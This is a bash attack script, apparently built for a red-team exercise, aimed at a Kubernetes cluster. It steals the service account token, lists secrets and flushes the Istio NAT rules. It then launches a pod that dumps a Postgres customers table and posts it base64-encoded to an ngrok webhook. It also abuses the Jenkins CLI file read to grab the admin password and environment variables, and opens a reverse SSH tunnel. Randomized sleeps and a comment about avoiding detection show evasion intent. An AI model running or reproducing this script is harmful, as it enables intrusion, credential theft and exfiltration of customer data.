#!/usr/bin/env bash

WEBHOOK_HOST="https://2f809789165d.ngrok-free.app"

MIN=350
MAX=700
RANGE=$((MAX - MIN + 1))
INTERVAL=$((RANDOM % RANGE + MIN))
echo "$INTERVAL"

is_k8s_environment() {
  if [ -n "${KUBERNETES_SERVICE_HOST:-}" ]; then
    echo "Kubernetes environment detected."
  else
    echo "Not running in a Kubernetes environment."
  fi
}

check_k8s_svcs() {
  echo "Checking Kubernetes services ..."
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/services --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | jq -r '.items[] | {name: .metadata.name, namespace: .metadata.namespace, ports: [.spec.ports[].port]}'
  curl -v http://jenkins.jenkins.svc.cluster.local:8080 2>&1
}

install_dependencies() {
  echo "Installing dependencies ..."
  apt update && apt install -y iptables openjdk-21-jdk-headless jq
}

check_proxy_config() {
  iptables-legacy -t nat -L
  iptables-legacy -t nat -F ISTIO_OUTPUT
}

send_webhook() {
  local message="$1"
  echo "Sending webhook to notify about the compromise ..."
  curl -X POST -H "Content-Type: application/json" --url "${WEBHOOK_HOST}/webhook" -d "$message"
}

attack_postgres() {
  echo "Attacking PostgreSQL ..."
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/secrets --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | jq # List all secrets in the current namespace but will fail if no permissions
  cat << 'EOF' > /tmp/pod.json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": { "name": "red-lumin", "namespace": "dandelion" },
  "spec": {
    "volumes": [
      {
        "name": "super-creds",
        "secret": { "secretName": "my-postgres-postgresql" }
      }
    ],
    "containers": [
      {
        "name": "loris-to-the-rescue",
        "image": "alpine/psql",
        "command": ["/bin/sh", "-c"],
        "args": [
          "apk add curl jq; DATA=$(PGUSER=testuser PGPASSWORD=$(cat /tmp/super-creds/password) PGHOST=my-postgres-postgresql PGDATABASE=testdb psql -t -A -c \"SELECT * FROM customers;\");ENCODED_DATA=$(echo $DATA | base64 -w 0); PARTICPANT_ID=ID_PLACEHOLDER; jq -n --arg id \"red-lumin-$PARTICPANT_ID\" --arg data \"$ENCODED_DATA\" '{\"id\": $id, \"data\": $data}' > data.json; curl -X POST -H \"Content-Type: application/json\" --url \"$WEBHOOK_HOST/webhook\" -d @data.json"
        ],
        "env": [{ "name": "WEBHOOK_HOST", "value": "https://2f809789165d.ngrok-free.app" }],
        "volumeMounts": [
          {
            "name": "super-creds",
            "readOnly": true,
            "mountPath": "/tmp/super-creds"
          }
        ]
      }
    ]
  }
}
EOF
  LOCAL_IP=$(curl -s ipinfo.io/ip)
  sed -i "s/ID_PLACEHOLDER/$LOCAL_IP/" /tmp/pod.json
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/dandelion/pods -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json" -d @/tmp/pod.json
  sleep 120
  curl -k https://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/dandelion/pods/red-lumin -X DELETE -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json"
  sleep 10
  rm -f /tmp/pod.json
}

attack_jenkins() {
  echo "Attacking Jenkins ..."
  curl -v http://jenkins.jenkins.svc.cluster.local:8080 2>&1
  curl -o jenkins-cli.jar http://jenkins.jenkins.svc.cluster.local:8080/jnlpJars/jenkins-cli.jar
  java -jar jenkins-cli.jar -s http://jenkins.jenkins.svc.cluster.local:8080 -http help 1 "@/var/jenkins_home/secrets/initialAdminPassword" 2>&1
  java -jar jenkins-cli.jar -s http://jenkins.jenkins.svc.cluster.local:8080 -http help 1 "@/proc/self/environ" 2>&1
  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 -R 5000:jenkins.jenkins.svc.cluster.local:8080 $(curl -sL ipinfo.io/ip) 2>&1
}

echo "Check current environment ..."
id
env
install_dependencies
sleep ${INTERVAL}
is_k8s_environment
check_k8s_svcs
sleep ${INTERVAL}
check_proxy_config
sleep 360
attack_postgres
# attack_jenkins should be the final step to avoid detection and continue the attack from the UI
sleep 300
attack_jenkins
